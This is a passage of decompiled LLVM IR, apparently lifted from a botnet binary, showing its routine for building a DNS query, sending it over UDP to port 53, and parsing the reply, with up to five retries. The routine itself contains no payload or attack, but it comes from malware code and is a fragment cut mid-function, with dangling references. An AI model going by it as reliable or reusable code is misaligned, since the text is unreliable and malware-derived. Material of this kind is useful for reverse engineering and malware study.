  %v3_e5bc = load i32, i32* @r4, align 4
  %v9_e5bc = load i32, i32* @r6, align 4
  %v12_e5bc = load i32, i32* @r7, align 4
  %v15_e5bc = load i32, i32* @r8, align 4
  %v18_e5bc = load i32, i32* @sb, align 4
  %v21_e5bc = load i32, i32* @sl, align 4
  %v24_e5bc = load i32, i32* @fp, align 4
  %v27_e5bc = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_e5d4 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_e5d4, i32* @fp, align 4
  %v0_e5dc = load i32, i32* @r5, align 4
  store i32 %v0_e5dc, i32* %r0.global-to-local, align 4
  %v1_e5e0 = inttoptr i32 %v0_e5dc to i8*
  %v2_e5e0 = call i32 @util_strlen(i8* %v1_e5e0)
  %v2_e5e8 = ptrtoint i16* %stack_var_-2244 to i32
  store i32 %v2_e5e8, i32* @sl, align 4
  %v2_e5ec = ptrtoint i32* %stack_var_-2232 to i32
  store i32 %v2_e5ec, i32* @sb, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_e5f4 = add i32 %v2_e5e0, 1
  store i32 %v1_e5f4, i32* %r0.global-to-local, align 4
  %v2_e5f8 = ptrtoint i32* %stack_var_-2230 to i32
  store i32 %v2_e5f8, i32* %r2.global-to-local, align 4
  store i32 %v2_e5ec, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_e5f4, i32* %r3.global-to-local, align 4
  %v2_e634146 = icmp eq i32 %v1_e5f4, 0
  store i1 %v2_e634146, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v1_e63c147 = add i32 %v2_e5f8, -1
  store i32 %v1_e63c147, i32* %r1.global-to-local, align 4
  %tmp116148 = icmp slt i32 %v1_e5f4, 1
  br i1 %tmp116148, label %dec_label_pc_e644, label %dec_label_pc_e608

dec_label_pc_e608:                                ; preds = %entry, %bb115
  %v0_e608151 = phi i32 [ %v1_e628, %bb115 ], [ 0, %entry ]
  %v1_e614150.off0 = phi i8 [ %extract.t152, %bb115 ], [ 0, %entry ]
  %v2_e648149 = phi i32 [ %v1_e62c, %bb115 ], [ %v2_e5f8, %entry ]
  %v1_e608 = load i32, i32* @r5, align 4
  %v2_e608 = add i32 %v1_e608, %v0_e608151
  %v3_e608 = inttoptr i32 %v2_e608 to i8*
  %v4_e608 = load i8, i8* %v3_e608, align 1
  %v6_e608 = zext i8 %v4_e608 to i32
  store i32 %v6_e608, i32* %r3.global-to-local, align 4
  %v2_e60c = icmp eq i8 %v4_e608, 0
  store i1 %v2_e60c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e60c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e608
  %v8_e610 = icmp eq i8 %v4_e608, 46
  store i1 %v8_e610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e610, label %.thread, label %.thread7

.thread:                                          ; preds = %dec_label_pc_e608, %bb
  %v3_e614 = load i32, i32* %r6.global-to-local, align 4
  %v4_e614 = inttoptr i32 %v3_e614 to i8*
  store i8 %v1_e614150.off0, i8* %v4_e614, align 1
  %v0_e618.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e618.pr, label %.thread9.thread13, label %.thread..thread7_crit_edge

.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_e618.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_e618.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_e618.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb
  %v3_e618 = phi i32 [ %v3_e618.pre, %.thread..thread7_crit_edge ], [ %v2_e648149, %bb ]
  %v1_e618.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v4_e608, %bb ]
  %v4_e618 = add i32 %v3_e618, -1
  %v5_e618 = inttoptr i32 %v4_e618 to i8*
  store i8 %v1_e618.off0, i8* %v5_e618, align 1
  %v0_e61c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e61c.pr, label %.thread9, label %.thread12

.thread9.thread13:                                ; preds = %.thread
  %v1_e61c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e61c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread9:                                         ; preds = %.thread7
  %v1_e61c11 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e61c11, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread12:                                        ; preds = %.thread7
  %v1_e624 = load i32, i32* @lr, align 4
  %v2_e624 = urem i32 %v1_e624, 256
  store i32 %v2_e624, i32* %r4.global-to-local, align 4
  br label %bb115

bb115:                                            ; preds = %.thread9, %.thread9.thread13, %.thread12
  %v0_e63833 = phi i32 [ 0, %.thread9.thread13 ], [ 0, %.thread9 ], [ %v2_e624, %.thread12 ]
  %v0_e628 = load i32, i32* %ip.global-to-local, align 4
  %v1_e628 = add i32 %v0_e628, 1
  store i32 %v1_e628, i32* %ip.global-to-local, align 4
  %v0_e62c = load i32, i32* %r2.global-to-local, align 4
  %v1_e62c = add i32 %v0_e62c, 1
  store i32 %v1_e62c, i32* %r2.global-to-local, align 4
  %v1_e630.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_e630 = sub i32 %v1_e630.pre, %v1_e628
  store i32 %v2_e630, i32* %r3.global-to-local, align 4
  %v2_e634 = icmp eq i32 %v2_e630, 0
  store i1 %v2_e634, i1* %cpsr_z.global-to-local, align 1
  %v1_e638 = add nuw nsw i32 %v0_e63833, 1
  store i32 %v1_e638, i32* @lr, align 4
  store i32 %v0_e62c, i32* %r1.global-to-local, align 4
  %tmp116 = icmp slt i32 %v2_e630, 1
  %extract.t152 = trunc i32 %v0_e63833 to i8
  br i1 %tmp116, label %dec_label_pc_e644, label %dec_label_pc_e608

dec_label_pc_e644:                                ; preds = %bb115, %entry
  %v1_e63c.lcssa = phi i32 [ %v1_e63c147, %entry ], [ %v0_e62c, %bb115 ]
  store i32 0, i32* @r4, align 4
  %v4_e648 = inttoptr i32 %v1_e63c.lcssa to i8*
  store i8 0, i8* %v4_e648, align 1
  store i32 %v2_e5ec, i32* %r0.global-to-local, align 4
  %v1_e650 = bitcast i32* %stack_var_-2232 to i8*
  %v2_e650 = call i32 @util_strlen(i8* %v1_e650)
  %v2_e654 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_e654, i32* %r1.global-to-local, align 4
  %v1_e658 = load i32, i32* @sb, align 4
  %v2_e658 = add i32 %v1_e658, %v2_e650
  store i32 %v2_e658, i32* @r5, align 4
  %v0_e660 = load i32, i32* @r4, align 4
  store i32 %v0_e660, i32* %stack_var_-68, align 4
  store i32 %v2_e5ec, i32* %r0.global-to-local, align 4
  %v2_e670 = call i32 @util_strlen(i8* %v1_e650)
  %v1_e674 = add i32 %v2_e670, 17
  store i32 %v1_e674, i32* %r0.global-to-local, align 4
  %v0_e67c = call i32 @rand_next()
  %v1_e67c = sext i32 %v0_e67c to i64
  store i32 -2147450879, i32* %r3.global-to-local, align 4
  %v5_e688 = mul nuw nsw i64 %v1_e67c, 2147516417
  %v6_e688 = udiv i64 %v5_e688, 4294967296
  %v7_e688 = trunc i64 %v6_e688 to i32
  %v8_e688 = trunc i64 %v5_e688 to i32
  store i32 %v8_e688, i32* @lr, align 4
  store i32 %v7_e688, i32* %r2.global-to-local, align 4
  %v5_e68c4 = udiv i64 %v5_e688, 140737488355328
  %v5_e68c = trunc i64 %v5_e68c4 to i32
  %v6_e68c = add i32 %v5_e68c, %v0_e67c
  store i32 16, i32* @r1, align 4
  %v6_e698 = urem i32 %v6_e68c, 65536
  store i32 %v6_e698, i32* %ip.global-to-local, align 4
  %v2_e6a0 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_e6a0, i32* @r0, align 4
  %v5_e6a4 = trunc i32 %v6_e68c to i16
  %v0_e6a8 = call i32 @util_zero()
  store i32 %v0_e6a8, i32* %r0.global-to-local, align 4
  store i32 13568, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v0_e6d8 = load i32, i32* @r5, align 4
  %v1_e6d8 = add i32 %v0_e6d8, 1
  store i32 %v1_e6d8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i16 %v5_e6a4, i16* %stack_var_-2244, align 2
  %v4_e6ec = inttoptr i32 %v1_e6d8 to i16*
  store i16 256, i16* %v4_e6ec, align 2
  %v0_e6f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e6f0 = trunc i32 %v0_e6f0 to i16
  %v2_e6f0 = load i32, i32* %r2.global-to-local, align 4
  %v3_e6f0 = add i32 %v2_e6f0, 2
  %v4_e6f0 = inttoptr i32 %v3_e6f0 to i16*
  store i16 %v1_e6f0, i16* %v4_e6f0, align 2
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_e788 = ptrtoint i32* %stack_var_-196 to i32
  %v2_e7b0 = ptrtoint i32* %stack_var_-40 to i32
  %v2_e7dc = ptrtoint i32* %stack_var_-52 to i32
  %v2_e820 = ptrtoint i16* %stack_var_-4292 to i32
  %v2_e8b4 = ptrtoint i32* %stack_var_-4280 to i32
  %v1_e8bc = bitcast i32* %stack_var_-4280 to i8*
  %v4_e8e0 = zext i16 %tmp79 to i32
  %v2_e8e4 = icmp eq i16 %tmp79, 0
  br label %dec_label_pc_e6fc

dec_label_pc_e6fc:                                ; preds = %dec_label_pc_e868, %dec_label_pc_e644
  %v1_e700 = phi i32 [ -1, %dec_label_pc_e644 ], [ %v0_e6fc.pre, %dec_label_pc_e868 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_e644 ], [ %v1_e868, %dec_label_pc_e868 ]
  store i32 %storemerge, i32* @r8, align 4
  %v7_e6fc = icmp eq i32 %v1_e700, -1
  store i1 %v7_e6fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6fc, label %bb118, label %bb117

bb117:                                            ; preds = %dec_label_pc_e6fc
  store i32 %v1_e700, i32* %r0.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %dec_label_pc_e6fc, %bb117
  store i32 59144, i32* @lr, align 4
  %v1_e704 = xor i1 %v7_e6fc, true
  call void @__pseudo_cond_branch(i1 %v1_e704, i32 ptrtoint (i32* @global_var_14aa0.112 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* @r1, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e714 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_e714, i32* %r0.global-to-local, align 4
  %v7_e718 = icmp eq i32 %v3_e714, -1
  store i1 %v7_e718, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e714, i32* @r6, align 4
  br i1 %v7_e718, label %dec_label_pc_e8a8, label %dec_label_pc_e724

dec_label_pc_e724:                                ; preds = %bb118
  store i32 %v2_e6a0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e730 = call i32 @__libc_connect(i32 %v3_e714, i32 %v2_e6a0, i32 16)
  store i32 %v3_e730, i32* %r0.global-to-local, align 4
  %v7_e734 = icmp eq i32 %v3_e730, -1
  store i1 %v7_e734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e734, label %dec_label_pc_e870, label %dec_label_pc_e73c

dec_label_pc_e73c:                                ; preds = %dec_label_pc_e724
  %v0_e73c = load i32, i32* @r6, align 4
  store i32 %v0_e73c, i32* %r0.global-to-local, align 4
  store i32 %v2_e5e8, i32* %r1.global-to-local, align 4
  store i32 %v1_e674, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e74c = call i32 @__libc_send(i32 %v0_e73c, i32 %v2_e5e8, i32 %v1_e674, i32 16384)
  store i32 %v4_e74c, i32* %r0.global-to-local, align 4
  %v7_e750 = icmp eq i32 %v4_e74c, -1
  store i1 %v7_e750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e750, label %dec_label_pc_e870, label %dec_label_pc_e758

dec_label_pc_e758:                                ; preds = %dec_label_pc_e73c
  %v0_e758 = load i32, i32* @r6, align 4
  store i32 %v0_e758, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_e764 = call i32 @__libc_fcntl(i32 3, i32 %v0_e758)
  %v0_e768 = load i32, i32* @r6, align 4
  store i32 %v0_e768, i32* %r1.global-to-local, align 4
  %v1_e76c = or i32 %v2_e764, 2048
  store i32 %v1_e76c, i32* @r2, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_e774 = call i32 @__libc_fcntl(i32 4, i32 %v0_e768)
  store i32 %v2_e774, i32* %r0.global-to-local, align 4
  store i32 %v2_e654, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %v2_e788, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e790

dec_label_pc_e790:                                ; preds = %dec_label_pc_e790, %dec_label_pc_e758
  %v1_e794 = phi i32 [ %v1_e798, %dec_label_pc_e790 ], [ 4, %dec_label_pc_e758 ]
  store i32 0, i32* @r4, align 4
  %v3_e794 = add i32 %v1_e794, %v2_e788
  %v4_e794 = inttoptr i32 %v3_e794 to i32*
  store i32 0, i32* %v4_e794, align 4
  %v0_e798 = load i32, i32* %r3.global-to-local, align 4
  %v1_e798 = add i32 %v0_e798, 4
  store i32 %v1_e798, i32* %r3.global-to-local, align 4
  %v7_e79c = icmp eq i32 %v1_e798, 128
  br i1 %v7_e79c, label %dec_label_pc_e7a4, label %dec_label_pc_e790

dec_label_pc_e7a4:                                ; preds = %dec_label_pc_e790
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e7a4 = load i32, i32* @r6, align 4
  %v3_e7a4 = udiv i32 %v0_e7a4, 32
  %v3_e7ac = mul nuw nsw i32 %v3_e7a4, 4
  store i32 %v3_e7ac, i32* %r3.global-to-local, align 4
  %v2_e7b4 = add i32 %v3_e7ac, %v2_e7b0
  store i32 %v2_e7b4, i32* @r5, align 4
  %v1_e7b8 = add i32 %v2_e7b4, -156
  %v2_e7b8 = inttoptr i32 %v1_e7b8 to i32*
  %v3_e7b8 = load i32, i32* %v2_e7b8, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_e7c0 = urem i32 %v0_e7a4, 32
  store i32 %v1_e7c0, i32* @r7, align 4
  %v7_e7c4 = shl i32 1, %v1_e7c0
  %v8_e7c4 = or i32 %v3_e7b8, %v7_e7c4
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_e7c4, i32* %v2_e7b8, align 4
  %v0_e7d4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_e7d4, i32* %stack_var_-52, align 4
  store i32 %v2_e7dc, i32* @lr, align 4
  store i32 %v2_e654, i32* %ip.global-to-local, align 4
  %v0_e7e4 = load i32, i32* @r6, align 4
  %v1_e7e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_e7e4 = add i32 %v1_e7e4, %v0_e7e4
  store i32 %v2_e7e4, i32* %r0.global-to-local, align 4
  %v0_e7ec = load i32, i32* @r4, align 4
  store i32 %v0_e7ec, i32* %r2.global-to-local, align 4
  store i32 %v0_e7ec, i32* %r3.global-to-local, align 4
  %v5_e7f8 = call i32 @__libc_select(i32 %v2_e7e4, i32 %v2_e788, i32 %v0_e7ec, i32 %v0_e7ec, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_e7f8, i32* %r0.global-to-local, align 4
  %v7_e7fc = icmp eq i32 %v5_e7f8, -1
  store i1 %v7_e7fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7fc, label %dec_label_pc_e880, label %dec_label_pc_e804

dec_label_pc_e804:                                ; preds = %dec_label_pc_e7a4
  %v1_e804 = load i32, i32* @r4, align 4
  %v9_e804 = icmp eq i32 %v5_e7f8, %v1_e804
  store i1 %v9_e804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e804, label %dec_label_pc_e860, label %dec_label_pc_e80c

dec_label_pc_e80c:                                ; preds = %dec_label_pc_e804
  %v0_e80c = load i32, i32* @r5, align 4
  %v1_e80c = add i32 %v0_e80c, -156
  %v2_e80c = inttoptr i32 %v1_e80c to i32*
  %v3_e80c = load i32, i32* %v2_e80c, align 4
  %v1_e810 = load i32, i32* @r7, align 4
  %v6_e810 = ashr i32 %v3_e80c, %v1_e810
  store i32 %v6_e810, i32* %r3.global-to-local, align 4
  %v1_e814 = urem i32 %v6_e810, 2
  %v2_e814 = icmp eq i32 %v1_e814, 0
  store i1 %v2_e814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e814, label %dec_label_pc_e880, label %dec_label_pc_e81c

dec_label_pc_e81c:                                ; preds = %dec_label_pc_e80c
  store i32 %v2_e820, i32* @r5, align 4
  store i32 %v2_e820, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e830 = load i32, i32* @r6, align 4
  store i32 %v0_e830, i32* %r0.global-to-local, align 4
  %v6_e83c = call i32 @__libc_recvfrom(i32 %v0_e830, i32 %v2_e820, i32 2048, i32 16384, i32 %v1_e804, i32 %v1_e804)
  store i32 %v6_e83c, i32* %r4.global-to-local, align 4
  %v0_e844 = load i32, i32* @sb, align 4
  store i32 %v0_e844, i32* %r0.global-to-local, align 4
  %v1_e848 = inttoptr i32 %v0_e844 to i8*
  %v2_e848 = call i32 @util_strlen(i8* %v1_e848)
  %v1_e84c = add i32 %v2_e848, 17
  store i32 %v1_e84c, i32* %r0.global-to-local, align 4
  %v0_e850 = load i32, i32* %r4.global-to-local, align 4
  %v3_e850 = icmp ult i32 %v0_e850, %v1_e84c
  %v9_e850 = icmp eq i32 %v0_e850, %v1_e84c
  store i1 %v9_e850, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_e850, label %dec_label_pc_e860, label %dec_label_pc_e8b4

dec_label_pc_e860:                                ; preds = %dec_label_pc_e81c, %dec_label_pc_e8b4, %dec_label_pc_e8e0, %dec_label_pc_e804, %dec_label_pc_e8a8
  %v0_e860 = load i32, i32* @r8, align 4
  %v7_e860 = icmp eq i32 %v0_e860, 5
  store i1 %v7_e860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e860, label %dec_label_pc_e880, label %dec_label_pc_e868

dec_label_pc_e868:                                ; preds = %dec_label_pc_e870, %dec_label_pc_e860
  %v0_e868 = phi i32 [ %v0_e878, %dec_label_pc_e870 ], [ %v0_e860, %dec_label_pc_e860 ]
  %v1_e868 = add i32 %v0_e868, 1
  %v0_e6fc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e6fc

dec_label_pc_e870:                                ; preds = %dec_label_pc_e73c, %dec_label_pc_e724
  %v0_e870 = phi i32 [ %v4_e74c, %dec_label_pc_e73c ], [ %v3_e730, %dec_label_pc_e724 ]
  %v1_e870 = add i32 %v0_e870, 2
  store i32 %v1_e870, i32* %r0.global-to-local, align 4
  %v1_e874 = call i32 @sleep(i32 %v1_e870)
  store i32 %v1_e874, i32* %r0.global-to-local, align 4
  %v0_e878 = load i32, i32* @r8, align 4
  %v7_e878 = icmp eq i32 %v0_e878, 5
  store i1 %v7_e878, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e878, label %dec_label_pc_e880, label %dec_label_pc_e868

dec_label_pc_e880:                                ; preds = %dec_label_pc_e870, %dec_label_pc_e860, %dec_label_pc_e80c, %dec_label_pc_e7a4, %dec_label_pc_e8ec, %dec_label_pc_e8f8.backedge
  %v0_e880 = load i32, i32* @r6, align 4
  store i32 %v0_e880, i32* %r0.global-to-local, align 4
  %v1_e884 = call i32 @__GI___libc_close(i32 %v0_e880)
  store i32 %v1_e884, i32* %r0.global-to-local, align 4
  %v0_e888 = load i32, i32* @fp, align 4
  %v1_e888 = inttoptr i32 %v0_e888 to i8*
  %v2_e888 = load i8, i8* %v1_e888, align 1
  %v3_e888 = zext i8 %v2_e888 to i32
  store i32 %v3_e888, i32* @r4, align 4
  %v2_e88c = icmp eq i8 %v2_e888, 0
  store i1 %v2_e88c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e88c, label %dec_label_pc_e9d0, label %dec_label_pc_e894

dec_label_pc_e894:                                ; preds = %dec_label_pc_e880, %dec_label_pc_e9d0
  %v0_e894 = phi i32 [ %v0_e888, %dec_label_pc_e880 ], [ %v0_e9e4, %dec_label_pc_e9d0 ]
  store i32 %v0_e894, i32* %r0.global-to-local, align 4
  store i32 %v3_e5bc, i32* @r4, align 4
  store i32 %v9_e5bc, i32* @r6, align 4
  store i32 %v12_e5bc, i32* @r7, align 4
  store i32 %v15_e5bc, i32* @r8, align 4
  store i32 %v18_e5bc, i32* @sb, align 4
  store i32 %v21_e5bc, i32* @sl, align 4
  store i32 %v24_e5bc, i32* @fp, align 4
  store i32 %v27_e5bc, i32* @lr, align 4
  ret i32 %v0_e894

dec_label_pc_e8a8:                                ; preds = %bb118
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e8ac = call i32 @sleep(i32 1)
  store i32 %v1_e8ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e860

dec_label_pc_e8b4:                                ; preds = %dec_label_pc_e81c
  store i32 %v2_e8b4, i32* @sb, align 4
  store i32 %v2_e8b4, i32* %r0.global-to-local, align 4
  %v2_e8bc = call i32 @util_strlen(i8* %v1_e8bc)
  store i32 %v2_e7b0, i32* @lr, align 4
  %v4_e8c8 = load i16, i16* %stack_var_-4292, align 2
  %v5_e8c8 = sext i16 %v4_e8c8 to i32
  store i32 %v5_e8c8, i32* %r3.global-to-local, align 4
  store i32 %v6_e68c, i32* @r1, align 4
  %v1_e8d0 = load i32, i32* @sb, align 4
  %v9_e8d4 = icmp eq i16 %v4_e8c8, %v5_e6a4
  store i1 %v9_e8d4, i1* %cpsr_z.global-to-local, align 1
  %v2_e8d0 = add i32 %v2_e8bc, 5
  %v1_e8d8 = add i32 %v2_e8d0, %v1_e8d0
  store i32 %v1_e8d8, i32* %r0.global-to-local, align 4
  br i1 %v9_e8d4, label %dec_label_pc_e8e0, label %dec_label_pc_e860

dec_label_pc_e8e0:                                ; preds = %dec_label_pc_e8b4
  store i32 %v4_e8e0, i32* %r3.global-to-local, align 4
  store i1 %v2_e8e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8e4, label %dec_label_pc_e860, label %dec_label_pc_e8ec

dec_label_pc_e8ec:                                ; preds = %dec_label_pc_e8e0
  %div = udiv i16 %tmp79, 256
  %v3_e8ec = zext i16 %div to i32
  store i32 %v3_e8ec, i32* %r2.global-to-local, align 4
  %v1_e8f0 = mul nuw nsw i32 %v4_e8e0, 256
  %v4_e8f4 = and i32 %v1_e8f0, 65280
  %v5_e8f4 = or i32 %v4_e8f4, %v3_e8ec
  %v1_e8f8134 = add nsw i32 %v5_e8f4, -1
  %v3_e8fc135 = mul i32 %v1_e8f8134, 65536
  store i32 %v3_e8fc135, i32* %r3.global-to-local, align 4
  %v7_e900141 = icmp eq i32 %v3_e8fc135, -65536
  store i1 %v7_e900141, i1* %cpsr_z.global-to-local, align 1
  %v3_e904142 = urem i32 %v1_e8f8134, 65536
  store i32 %v3_e904142, i32* @r8, align 4
  br i1 %v7_e900141, label %dec_label_pc_e880, label %dec_label_pc_e90c

dec_label_pc_e90c:                                ; preds = %dec_label_pc_e8ec, %dec_label_pc_e8f8.backedge
  %v3_e904144 = phi i32 [ %v3_e904, %dec_label_pc_e8f8.backedge ], [ %v3_e904142, %dec_label_pc_e8ec ]
  %v0_e95c143 = phi i32 [ %storemerge29, %dec_label_pc_e8f8.backedge ], [ %v1_e8d8, %dec_label_pc_e8ec ]
  store i32 %v0_e95c143, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_e91818 = inttoptr i32 %v0_e95c143 to i8*
  %v2_e91819 = load i8, i8* %v1_e91818, align 1
  %v3_e91820 = zext i8 %v2_e91819 to i32
  store i32 %v3_e91820, i32* %r2.global-to-local, align 4
  %v2_e91c21 = icmp eq i8 %v2_e91819, 0
  store i1 %v2_e91c21, i1* %cpsr_z.global-to-local, align 1
  %v3_e92022 = mul nuw nsw i32 %v3_e91820, 256
  store i32 %v3_e92022, i32* @r1, align 4
  br i1 %v2_e91c21, label %dec_label_pc_e954, label %dec_label_pc_e928.preheader

dec_label_pc_e928.preheader:                      ; preds = %dec_label_pc_e90c, %dec_label_pc_e918.backedge
  %v1_e9f4 = phi i32 [ %v1_e9f450, %dec_label_pc_e918.backedge ], [ 1, %dec_label_pc_e90c ]
  %v0_e9ec48 = phi i32 [ %v0_e9ec, %dec_label_pc_e918.backedge ], [ 0, %dec_label_pc_e90c ]
  %v0_e93446 = phi i32 [ %v3_e920, %dec_label_pc_e918.backedge ], [ %v3_e92022, %dec_label_pc_e90c ]
  %v0_e93044 = phi i32 [ %v1_e9f0, %dec_label_pc_e918.backedge ], [ %v0_e95c143, %dec_label_pc_e90c ]
  %v0_e92842 = phi i32 [ %v3_e918, %dec_label_pc_e918.backedge ], [ %v3_e91820, %dec_label_pc_e90c ]
  br label %dec_label_pc_e928

dec_label_pc_e928:                                ; preds = %dec_label_pc_e928.preheader, %dec_label_pc_e930
  %v0_e9ec = phi i32 [ %v0_e9ec48, %dec_label_pc_e928.preheader ], [ 1, %dec_label_pc_e930 ]
  %v0_e934 = phi i32 [ %v0_e93446, %dec_label_pc_e928.preheader ], [ %v3_e94c, %dec_label_pc_e930 ]
  %v0_e9f0 = phi i32 [ %v0_e93044, %dec_label_pc_e928.preheader ], [ %v2_e93c, %dec_label_pc_e930 ]
  %v0_e928 = phi i32 [ %v0_e92842, %dec_label_pc_e928.preheader ], [ %v3_e940, %dec_label_pc_e930 ]
  %v7_e928 = icmp eq i32 %v0_e928, 191
  store i1 %v7_e928, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v0_e928, 192
  br i1 %tmp, label %dec_label_pc_e9ec, label %dec_label_pc_e930

dec_label_pc_e930:                                ; preds = %dec_label_pc_e928
  %v1_e930 = add i32 %v0_e9f0, 1
  %v2_e930 = inttoptr i32 %v1_e930 to i8*
  %v3_e930 = load i8, i8* %v2_e930, align 1
  %v4_e930 = zext i8 %v3_e930 to i32
  %v2_e934 = or i32 %v4_e930, -49152
  %v0_e93c = load i32, i32* @r5, align 4
  %v1_e938 = add i32 %v0_e93c, %v0_e934
  %v2_e93c = add i32 %v1_e938, %v2_e934
  store i32 %v2_e93c, i32* %r3.global-to-local, align 4
  %v1_e940 = inttoptr i32 %v2_e93c to i8*
  %v2_e940 = load i8, i8* %v1_e940, align 1
  %v3_e940 = zext i8 %v2_e940 to i32
  store i32 %v3_e940, i32* %r2.global-to-local, align 4
  %v2_e944 = icmp eq i8 %v2_e940, 0
  store i1 %v2_e944, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v3_e94c = mul nuw nsw i32 %v3_e940, 256
  store i32 %v3_e94c, i32* @r1, align 4
  br i1 %v2_e944, label %dec_label_pc_e954, label %dec_label_pc_e928

dec_label_pc_e954:                                ; preds = %dec_label_pc_e918.backedge, %dec_label_pc_e930, %dec_label_pc_e90c
  %v1_e958 = phi i32 [ 1, %dec_label_pc_e90c ], [ %v1_e9f4, %dec_label_pc_e930 ], [ %v1_e9f450, %dec_label_pc_e918.backedge ]
  %v0_e954 = phi i32 [ 0, %dec_label_pc_e90c ], [ 1, %dec_label_pc_e930 ], [ %v0_e9ec, %dec_label_pc_e918.backedge ]
  %v7_e954 = icmp eq i32 %v0_e954, 1
  store i1 %v7_e954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e954, label %bb119, label %bb120

bb119:                                            ; preds = %dec_label_pc_e954
  %v2_e958 = add i32 %v1_e958, 1
  store i32 %v2_e958, i32* %ip.global-to-local, align 4
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_e954, %bb119
  %v1_e95c = phi i32 [ %v1_e958, %dec_label_pc_e954 ], [ %v2_e958, %bb119 ]
  %v2_e95c = add i32 %v1_e95c, %v0_e95c143
  store i32 %v2_e95c, i32* @r4, align 4
  %v3_e960 = inttoptr i32 %v2_e95c to i8*
  %v4_e960 = load i8, i8* %v3_e960, align 1
  %v6_e960 = zext i8 %v4_e960 to i32
  store i32 %v6_e960, i32* %r3.global-to-local, align 4
  %v1_e964 = add i32 %v2_e95c, 1
  %v2_e964 = inttoptr i32 %v1_e964 to i8*
  %v3_e964 = load i8, i8* %v2_e964, align 1
  %v4_e964 = zext i8 %v3_e964 to i32
  store i32 %v4_e964, i32* %r2.global-to-local, align 4
  %v4_e968 = mul nuw nsw i32 %v4_e964, 256
  %v5_e968 = or i32 %v4_e968, %v6_e960
  store i32 %v5_e968, i32* %r3.global-to-local, align 4
  %v7_e96c = icmp eq i32 %v5_e968, 256
  store i1 %v7_e96c, i1* %cpsr_z.global-to-local, align 1
  %v1_e970 = add i32 %v2_e95c, 10
  store i32 %v1_e970, i32* @r7, align 4
  br i1 %v7_e96c, label %dec_label_pc_ea0c, label %dec_label_pc_e978

dec_label_pc_e978:                                ; preds = %dec_label_pc_ea0c, %bb120
  store i32 %v1_e970, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
